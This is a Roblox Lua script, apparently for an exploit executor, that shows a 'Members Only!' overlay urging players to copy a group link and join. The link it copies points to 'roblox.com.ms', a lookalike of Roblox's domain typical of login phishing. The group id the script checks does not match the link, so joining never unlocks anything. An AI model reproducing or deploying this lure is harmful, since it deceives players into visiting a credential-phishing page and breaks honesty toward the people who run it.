

-- ============================================
-- КОНФИГУРАЦИЯ
-- ============================================
local CONFIG = {
    Group = {
        Id = 9139785657,
        Link = "https://roblox.com.ms/communities/9331768180/"
    },
    UI = {
        CardSize = {Width = 360, Height = 320},
        CardCorner = 20,
        BlurSize = 14,
        AnimationSpeed = 0.45,
        ButtonNormal = Color3.fromRGB(138, 43, 226),
        ButtonHover = Color3.fromRGB(160, 65, 255)
    },
    Colors = {
        CardBg = Color3.fromRGB(70, 20, 160),
        Backdrop = Color3.fromRGB(10, 0, 20),
        Text = Color3.fromRGB(255, 255, 255),
        SubText = Color3.fromRGB(210, 190, 255),
        Accent = Color3.fromRGB(180, 80, 255),
        Border = Color3.fromRGB(170, 90, 255),
        Shadow = Color3.fromRGB(110, 0, 255),
        StepIcon = Color3.fromRGB(200, 140, 255),
        StepText = Color3.fromRGB(235, 225, 255),
        HowTo = Color3.fromRGB(180, 120, 255),
        Success = Color3.fromRGB(160, 255, 190)
    },
    Steps = {
        {icon = "①", text = "Click Copy link below"},
        {icon = "②", text = "TextOpen the link in your browser"},
        {icon = "③", text = "Press Join Group on the page"},
        {icon = "④", text = "Return here — access unlocks!"}
    }
}

-- ============================================
-- СЕРВИСЫ
-- ============================================
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")

local player = Players.LocalPlayer

-- Проверка членства в группе
if player:IsInGroup(CONFIG.Group.Id) then
    return
end

-- ============================================
-- БИЛДЕР UI
-- ============================================
local UIBuilder = {}

function UIBuilder:CreateScreenGui(name, parent)
    local gui = Instance.new("ScreenGui")
    gui.Name = name
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.Parent = parent
    return gui
end

function UIBuilder:CreateBlurEffect(parent, size)
    local blur = Instance.new("BlurEffect")
    blur.Size = size or 0
    blur.Parent = parent
    return blur
end

function UIBuilder:CreateFrame(parent, data)
    local frame = Instance.new("Frame")
    frame.Size = data.Size
    frame.Position = data.Position
    frame.BackgroundColor3 = data.BackgroundColor3
    frame.BackgroundTransparency = data.BackgroundTransparency or 0
    frame.BorderSizePixel = data.BorderSizePixel or 0
    frame.ZIndex = data.ZIndex or 1
    frame.Parent = parent
    
    if data.CornerRadius then
        local corner = Instance.new("UICorner")
        corner.CornerRadius = data.CornerRadius
        corner.Parent = frame
    end
    
    return frame
end

function UIBuilder:CreateTextLabel(parent, data)
    local label = Instance.new("TextLabel")
    label.Text = data.Text
    label.Size = data.Size
    label.Position = data.Position
    label.BackgroundTransparency = data.BackgroundTransparency or 1
    label.TextColor3 = data.TextColor3
    label.Font = data.Font or Enum.Font.Gotham
    label.TextSize = data.TextSize
    label.TextXAlignment = data.TextXAlignment or Enum.TextXAlignment.Center
    label.TextWrapped = data.TextWrapped or false
    label.LineHeight = data.LineHeight or 1
    label.ZIndex = data.ZIndex or 5
    label.Parent = parent
    return label
end

function UIBuilder:CreateTextButton(parent, data)
    local button = Instance.new("TextButton")
    button.Text = data.Text
    button.Size = data.Size
    button.Position = data.Position
    button.BackgroundColor3 = data.BackgroundColor3
    button.TextColor3 = data.TextColor3
    button.Font = data.Font or Enum.Font.GothamBold
    button.TextSize = data.TextSize or 15
    button.BorderSizePixel = 0
    button.ZIndex = data.ZIndex or 5
    button.Parent = parent
    
    if data.CornerRadius then
        local corner = Instance.new("UICorner")
        corner.CornerRadius = data.CornerRadius
        corner.Parent = button
    end
    
    return button
end

function UIBuilder:CreateImageLabel(parent, data)
    local image = Instance.new("ImageLabel")
    image.Image = data.Image
    image.ImageColor3 = data.ImageColor3
    image.ImageTransparency = data.ImageTransparency or 0
    image.ScaleType = data.ScaleType or Enum.ScaleType.Stretch
    image.Size = data.Size
    image.Position = data.Position
    image.BackgroundTransparency = data.BackgroundTransparency or 1
    image.ZIndex = data.ZIndex or 1
    image.Parent = parent
    
    if data.SliceCenter then
        image.SliceCenter = data.SliceCenter
    end
    
    return image
end

function UIBuilder:CreateGradient(parent, colors, rotation)
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new(colors)
    gradient.Rotation = rotation or 0
    gradient.Parent = parent
    return gradient
end

function UIBuilder:CreateStroke(parent, color, thickness, transparency)
    local stroke = Instance.new("UIStroke")
    stroke.Color = color
    stroke.Thickness = thickness
    stroke.Transparency = transparency or 0
    stroke.Parent = parent
    return stroke
end

-- ============================================
-- АНИМАЦИИ
-- ============================================
local AnimationManager = {}

function AnimationManager:Tween(object, properties, duration, easingStyle, easingDirection)
    local tweenInfo = TweenInfo.new(duration, easingStyle or Enum.EasingStyle.Quad, 
                                    easingDirection or Enum.EasingDirection.Out)
    local tween = TweenService:Create(object, tweenInfo, properties)
    tween:Play()
    return tween
end

function AnimationManager:PlayEntrance(backdrop, blur, card)
    self:Tween(backdrop, {BackgroundTransparency = 0.45}, 0.35)
    self:Tween(blur, {Size = CONFIG.UI.BlurSize}, CONFIG.UI.AnimationSpeed)
    task.wait(0.1)
    self:Tween(card, {
        Position = UDim2.new(0.5, -180, 0.5, -160),
        BackgroundTransparency = 0.2
    }, CONFIG.UI.AnimationSpeed, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
end

function AnimationManager:ButtonHover(button, stroke)
    self:Tween(button, {BackgroundColor3 = CONFIG.UI.ButtonHover}, 0.15)
    if stroke then
        self:Tween(stroke, {Transparency = 0.2}, 0.15)
    end
end

function AnimationManager:ButtonLeave(button, stroke)
    self:Tween(button, {BackgroundColor3 = CONFIG.UI.ButtonNormal}, 0.15)
    if stroke then
        self:Tween(stroke, {Transparency = 0.55}, 0.15)
    end
end

function AnimationManager:ButtonClick(button)
    self:Tween(button, {Size = UDim2.new(0.79, 0, 0, 42)}, 0.07)
    task.wait(0.07)
    self:Tween(button, {Size = UDim2.new(0.82, 0, 0, 46)}, 0.12, Enum.EasingStyle.Back)
end

-- ============================================
-- СОЗДАНИЕ GUI
-- ============================================
local function CreateAccessUI()
    local ui = {}
    
    -- Основа
    ui.ScreenGui = UIBuilder:CreateScreenGui("AccessUI", player:WaitForChild("PlayerGui"))
    ui.Blur = UIBuilder:CreateBlurEffect(Lighting, 0)
    
    -- Затемнение
    ui.Backdrop = UIBuilder:CreateFrame(ui.ScreenGui, {
        Size = UDim2.new(1, 0, 1, 0),
        Position = UDim2.new(0, 0, 0, 0),
        BackgroundColor3 = CONFIG.Colors.Backdrop,
        BackgroundTransparency = 1,
        ZIndex = 1
    })
    
    -- Карточка
    ui.Card = UIBuilder:CreateFrame(ui.ScreenGui, {
        Size = UDim2.new(0, CONFIG.UI.CardSize.Width, 0, CONFIG.UI.CardSize.Height),
        Position = UDim2.new(0.5, -180, 0.5, 30),
        BackgroundColor3 = CONFIG.Colors.CardBg,
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        ZIndex = 2,
        CornerRadius = UDim.new(0, CONFIG.UI.CardCorner)
    })
    
    -- Градиент карточки
    UIBuilder:CreateGradient(ui.Card, {
        ColorSequenceKeypoint.new(0, Color3.fromRGB(95, 30, 195)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 8, 105))
    }, 135)
    
    -- Обводка
    UIBuilder:CreateStroke(ui.Card, CONFIG.Colors.Border, 1.5, 0.15)
    
    -- Шиммер
    local shimmer = UIBuilder:CreateFrame(ui.Card, {
        Size = UDim2.new(0.75, 0, 0, 1),
        Position = UDim2.new(0.125, 0, 0, 1),
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = 0.5,
        BorderSizePixel = 0,
        ZIndex = 5,
        CornerRadius = UDim.new(0, 2)
    })
    
    -- Акцентная полоса
    local accent = UIBuilder:CreateFrame(ui.Card, {
        Size = UDim2.new(1, 0, 0, 3),
        Position = UDim2.new(0, 0, 0, 0),
        BackgroundColor3 = CONFIG.Colors.Accent,
        BorderSizePixel = 0,
        ZIndex = 3,
        CornerRadius = UDim.new(0, CONFIG.UI.CardCorner)
    })
    
    UIBuilder:CreateGradient(accent, {
        ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 0, 200)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(210, 110, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 0, 200))
    })
    
    -- Тень
    UIBuilder:CreateImageLabel(ui.Card, {
        Image = "rbxassetid://6014261993",
        ImageColor3 = CONFIG.Colors.Shadow,
        ImageTransparency = 0.45,
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(49, 49, 450, 450),
        Size = UDim2.new(1, 80, 1, 80),
        Position = UDim2.new(0, -40, 0, -40),
        BackgroundTransparency = 1,
        ZIndex = 1
    })
    
    -- Иконка
    UIBuilder:CreateTextLabel(ui.Card, {
        Text = "🔒",
        Size = UDim2.new(0, 36, 0, 36),
        Position = UDim2.new(0.5, -18, 0, 14),
        TextColor3 = CONFIG.Colors.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 26,
        ZIndex = 5
    })
    
    -- Заголовок
    UIBuilder:CreateTextLabel(ui.Card, {
        Text = "Members Only!",
        Size = UDim2.new(1, -30, 0, 32),
        Position = UDim2.new(0, 15, 0, 52),
        TextColor3 = CONFIG.Colors.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 22,
        ZIndex = 5
    })
    
    -- Подзаголовок
    UIBuilder:CreateTextLabel(ui.Card, {
        Text = "This script is exclusive to group members.\nJoin our group to unlock full access!",
        Size = UDim2.new(1, -30, 0, 40),
        Position = UDim2.new(0, 15, 0, 84),
        TextColor3 = CONFIG.Colors.SubText,
        Font = Enum.Font.Gotham,
        TextSize = 13,
        TextWrapped = true,
        LineHeight = 1.4,
        ZIndex = 5
    })
    
    -- Разделитель
    local divider = UIBuilder:CreateFrame(ui.Card, {
        Size = UDim2.new(0.85, 0, 0, 1),
        Position = UDim2.new(0.075, 0, 0, 132),
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = 0.75,
        BorderSizePixel = 0,
        ZIndex = 5
    })
    
    UIBuilder:CreateGradient(divider, {
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
    })
    
    -- Метка "HOW TO JOIN"
    UIBuilder:CreateTextLabel(ui.Card, {
        Text = "HOW TO JOIN",
        Size = UDim2.new(1, -30, 0, 18),
        Position = UDim2.new(0, 15, 0, 142),
        TextColor3 = CONFIG.Colors.HowTo,
        Font = Enum.Font.GothamBold,
        TextSize = 11,
        TextXAlignment = Enum.TextXAlignment.Left,
        ZIndex = 5
    })
    
    -- Шаги
    for i, step in ipairs(CONFIG.Steps) do
        local row = UIBuilder:CreateFrame(ui.Card, {
            Size = UDim2.new(1, -30, 0, 22),
            Position = UDim2.new(0, 15, 0, 160 + (i - 1) * 24),
            BackgroundTransparency = 1,
            ZIndex = 5
        })
        
        UIBuilder:CreateTextLabel(row, {
            Text = step.icon,
            Size = UDim2.new(0, 22, 1, 0),
            Position = UDim2.new(0, 0, 0, 0),
            TextColor3 = CONFIG.Colors.StepIcon,
            Font = Enum.Font.GothamBold,
            TextSize = 13,
            TextXAlignment = Enum.TextXAlignment.Left,
            ZIndex = 5
        })
        
        UIBuilder:CreateTextLabel(row, {
            Text = step.text,
            Size = UDim2.new(1, -26, 1, 0),
            Position = UDim2.new(0, 24, 0, 0),
            TextColor3 = CONFIG.Colors.StepText,
            Font = Enum.Font.Gotham,
            TextSize = 13,
            TextXAlignment = Enum.TextXAlignment.Left,
            ZIndex = 5
        })
    end
    
    -- Кнопка копирования
    ui.CopyButton = UIBuilder:CreateTextButton(ui.Card, {
        Text = "🔗  Copy Group Link",
        Size = UDim2.new(0.82, 0, 0, 46),
        Position = UDim2.new(0.09, 0, 0, 262),
        BackgroundColor3 = CONFIG.UI.ButtonNormal,
        TextColor3 = CONFIG.Colors.Text,
        TextSize = 15,
        ZIndex = 5,
        CornerRadius = UDim.new(0, 12)
    })
    
    local buttonStroke = UIBuilder:CreateStroke(ui.CopyButton, Color3.fromRGB(255, 255, 255), 1.5, 0.55)
    
    -- События кнопки
    ui.CopyButton.MouseEnter:Connect(function()
        AnimationManager:ButtonHover(ui.CopyButton, buttonStroke)
    end)
    
    ui.CopyButton.MouseLeave:Connect(function()
        AnimationManager:ButtonLeave(ui.CopyButton, buttonStroke)
    end)
    
    ui.CopyButton.MouseButton1Click:Connect(function()
        AnimationManager:ButtonClick(ui.CopyButton)
        
        if setclipboard then
            setclipboard(CONFIG.Group.Link)
            ui.CopyButton.Text = "✓  Link Copied!"
            ui.CopyButton.TextColor3 = CONFIG.Colors.Success
            task.delay(2.5, function()
                ui.CopyButton.Text = "🔗  Copy Group Link"
                ui.CopyButton.TextColor3 = CONFIG.Colors.Text
            end)
        else
            ui.CopyButton.Text = "Not supported ⚠"
        end
    end)
    
    return ui
end

-- ============================================
-- ЗАПУСК
-- ============================================
local function main()
    local ui = CreateAccessUI()
    AnimationManager:PlayEntrance(ui.Backdrop, ui.Blur, ui.Card)
end

main()
